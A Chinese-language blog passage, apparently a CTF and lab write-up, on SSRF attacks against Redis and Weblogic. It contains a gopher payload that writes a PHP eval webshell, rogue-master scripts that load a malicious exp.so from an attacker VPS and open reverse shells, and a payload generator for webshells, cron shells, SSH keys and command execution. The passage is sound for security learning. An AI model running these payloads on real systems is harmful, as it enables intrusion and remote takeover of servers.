    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<p>py2运行，这里需要两次url编码</p>
<pre><code class="hljs plaintext">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_GET%255B%2522cmd%2522%25
5D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230172917747.png" alt="image-20231230172917747"></p>
<p>直接url上传，之后访问shell.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230172959844.png" alt="image-20231230172959844"></p>
<p>成功上传并拿到flag</p>
<h2 id="redis-4x5x主从复制rce">Redis 4.x/5.x主从复制RCE</h2>
<p>复现地址：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/redis/4-unacc/">https://vulhub.org/#/environments/redis/4-unacc/</a></p>
<p>直接vulhub一键启动靶机，之后kali尝试连接目标redis，如下图，存在未授权访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230190041291.png" alt="image-20231230190041291"></p>
<p>直接上exp，这里使用了两种，但感觉第一种更好一点</p>
<pre><code class="hljs py">python3 redis-rogue-server.py --rhost <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.137</span> --rport <span class="hljs-number">6379</span> --lhost <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.130</span> <span class="hljs-number">6666</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230194558436.png" alt="image-20231230194558436"></p>
<p>可以看到直接就拿到shell了</p>
<p>第二个：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<pre><code class="hljs py">python3 redis-master.py -r <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.137</span> -p <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span><span class="hljs-number">.246</span><span class="hljs-number">.130</span> -P <span class="hljs-number">6666</span> -f RedisModulesSDK/exp.so -c <span class="hljs-string">"id"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230194640807.png" alt="image-20231230194640807"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230194648625.png" alt="image-20231230194648625"></p>
<h2 id="网鼎杯-2020-玄武组ssrfme">[网鼎杯 2020 玄武组]SSRFMe</h2>
<p>这里推荐去nssctf平台复现，buu似乎有问题</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,<span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)
    {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'url fomat error'</span>);
    }
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);
    }
    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)
    {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'url fomat error'</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">'host'</span>];
    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);
    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'127.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'10.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'172.16.0.0'</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'192.168.0.0'</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>{

    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>))
    {
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">' is inner ip'</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">'redirect_url'</span>])
        {
            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">'redirect_url'</span>]);
        }
        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>);
    }

}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])){
    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>)){
        <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>);
    }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-comment">// Please visit hint.php locally.</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里的重点就是针对url的检查，其中的对于用到的协议他规定只能是http、https、gopher与dict，但我们重点需要绕过的是这个：</p>
<pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'127.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'10.0.0.0'</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'172.16.0.0'</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">'192.168.0.0'</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;
}</code></pre>
<p>这里是将一个标准ip地址转换为二进制形式的长字符串，然后与这里规定的127.0.0.1、10.0.0.0、172.16.0.0、192.168.0.0进行比较，如果有一个为真，则证明标志的ssrf的攻击</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 初始的8的二进制表示，右边有两位空出：</span>
<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">1000</span>
<span class="hljs-comment">// 执行右移两位后：</span>
<span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span></code></pre>
<p>这里绕过似乎也挺简单的，就是0.0.0.0即可，然后根据题目提示让我们查看hint.php</p>
<pre><code class="hljs http">?url=http://0.0.0.0/hint.php</code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REMOTE_ADDR'</span>]===<span class="hljs-string">"127.0.0.1"</span>){
  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])){
  <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>],<span class="hljs-string">"&lt;?php echo 'redispass is root';exit();"</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>]);
}</code></pre>
<p>随后就是通过file_put_contents函数处理post传参，并且代码中提示我们redis的密码是root，这也提示我们这道题考察的就是如何通过ssrf攻击redis</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231230205726243.png" alt="image-20231230205726243"></p>
<p>这里验证也说明6379的存在，<a target="_blank" rel="noopener" href="http://xn--ghq0cy2jjf78cg9c8uxsoimlb56n0plii4i16j.so">接下来先尝试向其中加载恶意.so</a>，不过需要注意密码的验证，payload如下：</p>
<pre><code class="hljs scss">auth root  #用户认证
config set dir /tmp/  #设置备份目录
config set dbfilename exp<span class="hljs-selector-class">.so</span>   #设置备份文件名
slaveof vpsip vpsport	#设置主从关系，这里的主redis设置为我们的恶意vps
module load /tmp/exp<span class="hljs-selector-class">.so</span>	#从我们的恶意主redis上加载恶意exp<span class="hljs-selector-class">.so</span>
system<span class="hljs-selector-class">.rev</span> vpsip vpsport	#执行system命令，进行反弹shell</code></pre>
<p>但这道题用到的是ssrf，所以上脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">import</span> requests
payload = <span class="hljs-string">"""auth root</span>
<span class="hljs-string">config set dir /tmp</span>
<span class="hljs-string">config set dbfilename exp.so</span>
<span class="hljs-string">slaveof vps port</span>
<span class="hljs-string">module load /tmp/exp.so</span>
<span class="hljs-string">system.rev vpsip vpsport</span>
<span class="hljs-string">"""</span>
inner_url = <span class="hljs-string">f"gopher://0.0.0.0:6379/_<span class="hljs-subst">{quote(quote(payload))}</span>"</span>
<span class="hljs-built_in">print</span>(inner_url)
<span class="hljs-comment">#url = "http://e90ce983-16dd-4dff-8850-58a09b264a47.node4.buuoj.cn:81/?url=" + inner_url</span>
<span class="hljs-comment">#resp = requests.get(url)</span>
<span class="hljs-comment">#print(resp.text)</span></code></pre>
<p>发送之前，我们先准备好恶意master，且必须是公网的vps，这里推荐项目：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server/blob/master/redis_rogue_server.py</a></p>
<p>上面这个用于需要授权的redis攻击使用</p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  --这个用于目标redis是未授权的时候使用</p>
<p>这里我们输入如下命令，这里需要将恶意exp.so文件放入<code>redis-rogue-server.py</code>同目录下</p>
<pre><code class="hljs py">python3 redis_rogue_server.py -path exp.so -lhost vps -lport <span class="hljs-number">5555</span>
<span class="hljs-comment">#指定exp.so文件路径 -lhost为我们的vpsip lport设置为vps要监听的端口</span></code></pre>
<p>这里实际上我们是等待被动连接，这里开启了上述服务后，我们构造命令发送</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">import</span> requests
<span class="hljs-comment"># auth root</span>
<span class="hljs-comment"># config set dir /tmp</span>
<span class="hljs-comment"># config set dbfilename exp.so</span>
<span class="hljs-comment"># slaveof vps 5555</span>
<span class="hljs-comment"># module load /tmp/exp.so</span>
<span class="hljs-comment"># system.rev vps 8888</span>
payload = <span class="hljs-string">"""auth root</span>
<span class="hljs-string">module load /tmp/exp.so</span>
<span class="hljs-string">system.rev vps 8888</span>
<span class="hljs-string">quit</span>
<span class="hljs-string">"""</span>
inner_url = <span class="hljs-string">f"gopher://0.0.0.0:6379/_<span class="hljs-subst">{quote(quote(payload))}</span>"</span>
<span class="hljs-built_in">print</span>(inner_url)</code></pre>
<p>这里我是分了两批payload发送，一起发送也是可以的，不过就得发送两次了，这里将得到的payload发送到ssrf漏洞点，接着就会发现我们的恶意服务收到了连接请求，但要注意在vps上开启接受反弹shell的端口。</p>
<p>最后就会发现我们成功拿到shell，这里不知为何截图都没了，懒得在搞了。</p>
<p>吐槽一手：buu题目环境害人啊，我一直不成功，还以为是我思路有问题，一直想不出来。。。。</p>
<h2 id="weblogic-ssrf漏洞">Weblogic SSRF漏洞</h2>
<h3 id="简介">简介</h3>
<p>WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p>
<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p>影响范围：</p>
<pre><code class="hljs plaintext">weblogic 版本10.0.2

weblogic 版本10.3.6</code></pre>
<h3 id="漏洞复现">漏洞复现</h3>
<p>复现环境：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/ssrf/">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231145729676.png" alt="image-20231231145729676"></p>
<p>如上图代表成功启动，这里我们直接bp抓个包，这里我先用dirsearch扫个目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231150520292.png" alt="image-20231231150520292"></p>
<p>可以发现还是有很多的，这里测试一番发现uddi这个目录很可疑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231150543048.png" alt="image-20231231150543048"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231150910443.png" alt="image-20231231150910443"></p>
<p>如上图，这里似乎是个未授权访问，点击第一个连接的search抓包发现，如下图存在一个url链接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231151343200.png" alt="image-20231231151343200"></p>
<p>这里修改个参数值为127.0.0.1，如下图发现其好像在尝试连接这个地址，我们探测一下端口存活情况</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231151722586.png" alt="image-20231231151722586"></p>
<p>bp爆破端口之后发现下图，这里并没有探测到什么重点端口，这里我就不会了，看了wp发现，比我想的更复杂，这里需要探测内网。。而我只是单纯探测个端口而已</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231152152338.png" alt="image-20231231152152338"></p>
<p>这里顺便补充一个资料：2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231152421261.png" alt="image-20231231152421261"></p>
<p>接下来就进行内网ip的探测，不过这里需要注意的是我们是用docker搭建的，因此探测的时候应该使用docker的ip段来探测</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231152729324.png" alt="image-20231231152729324"></p>
<p>我们开始设置爆破格式，自定义迭代器的payload类型</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231152918892.png" alt="image-20231231152918892"></p>
<p>这里在1中输入172，然后下方添加.分隔符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231152940854.png" alt="image-20231231152940854"></p>
<p>位置2填入17与分隔符.  这里搞错了，对我的靶机来说是该填入19的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231153015380.png" alt="image-20231231153015380"></p>
<p>位置三设置0-255与分隔符.  然后位置4设置0-255，但不需要设置分隔符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231154011663.png" alt="image-20231231154011663"></p>
<p>开始爆破，结果如下图所示，这里的爆破就说明我们的ip是存在的，但是对应的端口不存在，那我们直接探测该ip的端口存活情况即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231155336238.png" alt="image-20231231155336238"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231155534328.png" alt="image-20231231155534328"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231155539276.png" alt="image-20231231155539276"></p>
<p>设置好开始爆破，如下图所示，这里的报错说明我们的端口是存活的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231231155623106.png" alt="image-20231231155623106"></p>
<p>Weblogic的SSRF有一个比较大的特点，就是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>那接下来我们尝试写入定时任务反弹shell</p>
<pre><code class="hljs py"><span class="hljs-comment">#!/usr/local/bin python</span>
<span class="hljs-comment"># coding=utf8</span>

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">except</span>:
    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_info</span>(<span class="hljs-params">passwd</span>):
    cmd = [
        <span class="hljs-string">"info"</span>,
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_shell</span>(<span class="hljs-params">filename, path, passwd, payload</span>):
    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_reverse</span>(<span class="hljs-params">filename, path, passwd, payload</span>):  <span class="hljs-comment"># centos</span>

    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sshkey</span>(<span class="hljs-params">filename, path, passwd, payload</span>):
    cmd = [<span class="hljs-string">"flushall"</span>,
           <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(payload),
           <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
           <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
           <span class="hljs-string">"save"</span>,
           <span class="hljs-string">"quit"</span>
           ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">"cat /etc/passwd"</span></span>):
    exp_filename = <span class="hljs-string">"exp.so"</span>
    cmd = [
        <span class="hljs-string">"SLAVEOF {} {}"</span>.<span class="hljs-built_in">format</span>(lhost, lport),
        <span class="hljs-string">"CONFIG SET dir /tmp/"</span>,
        <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(exp_filename),
        <span class="hljs-string">"MODULE LOAD /tmp/{}"</span>.<span class="hljs-built_in">format</span>(exp_filename),
        <span class="hljs-string">"system.exec {}"</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"${IFS}"</span>)),
        <span class="hljs-comment"># "SLAVEOF NO ONE",</span>
        <span class="hljs-comment"># "CONFIG SET dbfilename dump.rdb",</span>
        <span class="hljs-comment"># "system.exec rm${IFS}/tmp/{}".format(exp_filename),</span>
        <span class="hljs-comment"># "MODULE UNLOAD system",</span>
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">rce_cleanup</span>():
    exp_filename = <span class="hljs-string">"exp.so"</span>
    cmd = [
        <span class="hljs-string">"SLAVEOF NO ONE"</span>,
        <span class="hljs-string">"CONFIG SET dbfilename dump.rdb"</span>,
        <span class="hljs-string">"system.exec rm /tmp/{}"</span>.<span class="hljs-built_in">format</span>(exp_filename).replace(<span class="hljs-string">" "</span>, <span class="hljs-string">"${IFS}"</span>),
        <span class="hljs-string">"MODULE UNLOAD system"</span>,
        <span class="hljs-string">"quit"</span>
    ]
    <span class="hljs-keyword">if</span> passwd:
        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF = <span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd = <span class="hljs-string">""</span>
    cmd += <span class="hljs-string">"*"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd += CRLF + <span class="hljs-string">"$"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x
    cmd += CRLF
    <span class="hljs-keyword">return</span> cmd


<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload</span>(<span class="hljs-params">passwd, mode</span>):
    payload = <span class="hljs-string">"test"</span>

    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:
        filename = <span class="hljs-string">"shell.php"</span>
